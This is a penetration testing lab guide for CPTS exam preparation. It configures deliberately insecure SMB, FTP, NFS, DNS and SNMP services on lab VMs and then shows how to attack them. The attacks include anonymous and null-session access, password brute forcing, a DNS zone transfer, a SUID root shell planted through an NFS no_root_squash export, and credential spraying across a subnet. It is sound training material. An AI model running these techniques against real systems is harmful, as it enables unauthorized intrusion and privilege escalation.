# CPTS Lab: Attacking Common Services

## Objective

Practice deep service enumeration against your VMs. On the CPTS exam, services like SMB, FTP, DNS, NFS, and SNMP hide credentials, files, and network intelligence that feed your attack chain. This lab builds services on your existing VMs and walks through exploiting each one.

---

## Setup

### CentOS (192.168.244.131) — SMB + FTP

```bash
# SMB with shares
sudo dnf install samba -y
sudo mkdir -p /srv/samba/{public,it_docs,backups}
echo "Welcome to the public share." | sudo tee /srv/samba/public/readme.txt
echo "VPN Config: vpn.company.local" | sudo tee /srv/samba/it_docs/vpn_setup.txt
echo "Deploy password: D3pl0yP@ss!" | sudo tee /srv/samba/it_docs/deploy_notes.txt
echo "Backup admin: bkadmin / Bk@dm1n2026" | sudo tee /srv/samba/backups/restore_creds.txt
echo "FLAG{smb_share_enumerated}" | sudo tee /srv/samba/backups/flag.txt

sudo chmod -R 755 /srv/samba/public
sudo chmod -R 755 /srv/samba/it_docs
sudo chmod -R 700 /srv/samba/backups

cat << 'EOF' | sudo tee /etc/samba/smb.conf
[global]
workgroup = WORKGROUP
server string = File Server
map to guest = Bad User

[public]
path = /srv/samba/public
browsable = yes
guest ok = yes
read only = yes

[it_docs]
path = /srv/samba/it_docs
browsable = yes
guest ok = no
read only = yes
valid users = smbuser

[backups]
path = /srv/samba/backups
browsable = no
guest ok = no
read only = yes
valid users = bkadmin
EOF

sudo useradd -M smbuser 2>/dev/null
echo -e "SmbUs3r!\nSmbUs3r!" | sudo smbpasswd -a smbuser -s
sudo useradd -M bkadmin 2>/dev/null
echo -e "Bk@dm1n2026\nBk@dm1n2026" | sudo smbpasswd -a bkadmin -s

sudo systemctl enable --now smb nmb

# FTP with anonymous access
sudo dnf install vsftpd -y
sudo mkdir -p /var/ftp/pub
echo "FTP Server - Company Files" | sudo tee /var/ftp/pub/welcome.txt
echo "IT Contact: admin@company.local" | sudo tee /var/ftp/pub/contacts.txt
echo "Test server SSH: testuser / T3stSSH!" | sudo tee /var/ftp/pub/server_notes.txt

sudo sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd/vsftpd.conf 2>/dev/null
echo "anonymous_enable=YES" | sudo tee -a /etc/vsftpd/vsftpd.conf 2>/dev/null
sudo systemctl enable --now vsftpd

# Open firewall
sudo iptables -I INPUT -p tcp --dport 445 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 139 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 20 -j ACCEPT
sudo iptables -I INPUT -p tcp --match multiport --dports 30000:31000 -j ACCEPT
```

### Debian (192.168.244.132) — NFS + DNS + SNMP

```bash
# NFS
sudo apt install nfs-kernel-server -y
sudo mkdir -p /srv/nfs/shared
echo "Internal wiki: 172.16.0.2:8080" | sudo tee /srv/nfs/shared/internal_hosts.txt
echo "DB admin: dbroot / R00tDB2026!" | sudo tee /srv/nfs/shared/db_creds.txt
echo "FLAG{nfs_mount_credentials}" | sudo tee /srv/nfs/shared/flag.txt
echo "/srv/nfs/shared *(rw,sync,no_root_squash)" | sudo tee /etc/exports
sudo exportfs -ra
sudo systemctl enable --now nfs-server

# DNS with zone file
sudo apt install bind9 -y
cat << 'EOF' | sudo tee /etc/bind/named.conf.local
zone "company.local" {
    type master;
    file "/etc/bind/db.company.local";
    allow-transfer { any; };
};
EOF

cat << 'EOF' | sudo tee /etc/bind/db.company.local
$TTL 86400
@   IN  SOA ns1.company.local. admin.company.local. (
        2026080401  ; Serial
        3600        ; Refresh
        900         ; Retry
        604800      ; Expire
        86400 )     ; Minimum TTL
    IN  NS  ns1.company.local.
ns1         IN  A   192.168.244.132
www         IN  A   192.168.244.132
mail        IN  A   192.168.244.132
dev         IN  A   192.168.244.132
staging     IN  A   192.168.244.132
admin       IN  A   192.168.244.131
vpn         IN  A   192.168.244.131
internal    IN  A   172.16.0.2
deploy      IN  A   172.16.0.2
db          IN  A   172.16.0.2
monitor     IN  A   192.168.244.133
EOF

sudo systemctl restart named

# SNMP
sudo apt install snmpd snmp -y
sudo sed -i 's/agentaddress  127.0.0.1/agentaddress udp:161/' /etc/snmp/snmpd.conf
echo "rocommunity public" | sudo tee -a /etc/snmp/snmpd.conf
echo "rocommunity internal 192.168.244.0/24" | sudo tee -a /etc/snmp/snmpd.conf
sudo systemctl restart snmpd

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

---

## Exercise 1: SMB Enumeration

### Step 1: Discover SMB shares

```bash
# Null session — list shares without credentials
smbclient -L //192.168.244.131 -N
# Shows: public, it_docs, backups

# Check what's accessible without creds
smbmap -H 192.168.244.131
# public: READ access (guest ok)
# it_docs: NO ACCESS (needs creds)
# backups: not visible (browsable = no)
```

### Step 2: Access the public share

```bash
smbclient //192.168.244.131/public -N
smb: \> ls
smb: \> get readme.txt
smb: \> exit

cat readme.txt
```

### Step 3: Enumerate users

```bash
# RID cycling (discover usernames without credentials)
crackmapexec smb 192.168.244.131 -u '' -p '' --rid-brute
# Discovers: smbuser, bkadmin, and system accounts
```

### Step 4: Brute force SMB credentials

```bash
# Try common passwords for discovered users
crackmapexec smb 192.168.244.131 -u smbuser -p /usr/share/seclists/Passwords/Common-Credentials/top-100.txt
# Or try found passwords from other services
```

### Step 5: Access authenticated shares

```bash
smbclient //192.168.244.131/it_docs -U 'smbuser%SmbUs3r!'
smb: \> ls
smb: \> get vpn_setup.txt
smb: \> get deploy_notes.txt
smb: \> exit

cat deploy_notes.txt
# Deploy password: D3pl0yP@ss!
```

**On the CPTS:** Credentials found in SMB shares feed directly into the credential reuse loop. Test `D3pl0yP@ss!` on every SSH/RDP/WinRM service.

---

## Exercise 2: FTP Enumeration

```bash
# Check for anonymous access
ftp 192.168.244.131
# Username: anonymous
# Password: (blank)
ftp> ls
ftp> cd pub
ftp> ls
ftp> mget *
ftp> exit

cat server_notes.txt
# Test server SSH: testuser / T3stSSH!
```

**Key takeaway:** Anonymous FTP is the easiest win. Always check. Files often contain credentials, documentation, and network architecture info.

---

## Exercise 3: NFS Enumeration

```bash
# Show exports (what shares are available)
showmount -e 192.168.244.132
# /srv/nfs/shared *

# Mount the share
sudo mkdir /mnt/nfs
sudo mount -t nfs 192.168.244.132:/srv/nfs/shared /mnt/nfs

ls /mnt/nfs/
cat /mnt/nfs/internal_hosts.txt
# Internal wiki: 172.16.0.2:8080
cat /mnt/nfs/db_creds.txt
# DB admin: dbroot / R00tDB2026!
cat /mnt/nfs/flag.txt
```

### Privesc via NFS no_root_squash

```bash
# Check if no_root_squash is set
# If it is, files created as root on your machine are root-owned on the target

# Create a SUID shell on the NFS share
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod u+s /mnt/nfs/rootbash

# On the target:
/srv/nfs/shared/rootbash -p
whoami    # root
```

**`no_root_squash` is a CPTS exam favorite.** Always check NFS exports and test for this misconfiguration.

```bash
# Unmount when done
sudo umount /mnt/nfs
```

---

## Exercise 4: DNS Zone Transfer

```bash
# Query the DNS server
dig @192.168.244.132 company.local

# Attempt zone transfer
dig axfr company.local @192.168.244.132
```

**What you get from a zone transfer:**

```
company.local.      IN  A     192.168.244.132
admin.company.local. IN A     192.168.244.131
vpn.company.local.  IN  A     192.168.244.131
internal.company.local. IN A  172.16.0.2
deploy.company.local.   IN A  172.16.0.2
db.company.local.       IN A  172.16.0.2
monitor.company.local.  IN A  192.168.244.133
```

**Every hostname is a target.** `internal`, `deploy`, and `db` all point to the internal network (172.16.0.2) — these are services you'd need to pivot to reach. `monitor` might be a new host you didn't know about.

Add discovered hostnames to `/etc/hosts` on Kali and enumerate each one.

---

## Exercise 5: SNMP Enumeration

```bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.244.132
# Finds: public, internal

# Walk with public community string
snmpwalk -v2c -c public 192.168.244.132

# Useful OIDs
snmpwalk -v2c -c public 192.168.244.132 1.3.6.1.2.1.1.5.0         # hostname
snmpwalk -v2c -c public 192.168.244.132 1.3.6.1.2.1.25.4.2.1.2     # running processes
snmpwalk -v2c -c public 192.168.244.132 1.3.6.1.2.1.4.20.1.1       # IP addresses

# Human-readable format
snmp-check 192.168.244.132 -c public
```

**What SNMP reveals:** Running processes (discover services not on standard ports), IP addresses on all interfaces (discover internal networks), installed software (find vulnerable versions), sometimes credentials in process arguments.

---

## Credential Chain from This Lab

```
FTP anonymous     → testuser / T3stSSH!
SMB public share  → readme (company info)
SMB it_docs share → D3pl0yP@ss! (deploy password)
SMB backups share → bkadmin / Bk@dm1n2026
NFS export        → dbroot / R00tDB2026!, internal host 172.16.0.2
DNS zone transfer → hostnames for admin, vpn, internal, deploy, db, monitor
SNMP              → running processes, IP addresses, internal network info

Every credential gets tested on EVERY service on EVERY host:
  crackmapexec ssh 192.168.244.0/24 -u testuser -p 'T3stSSH!'
  crackmapexec ssh 192.168.244.0/24 -u bkadmin -p 'Bk@dm1n2026'
```

---

## Cleanup

```bash
# CentOS
sudo systemctl stop smb nmb vsftpd
sudo rm -rf /srv/samba /var/ftp/pub
sudo iptables -F

# Debian
sudo systemctl stop nfs-server named snmpd
sudo rm -rf /srv/nfs /etc/bind/db.company.local
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
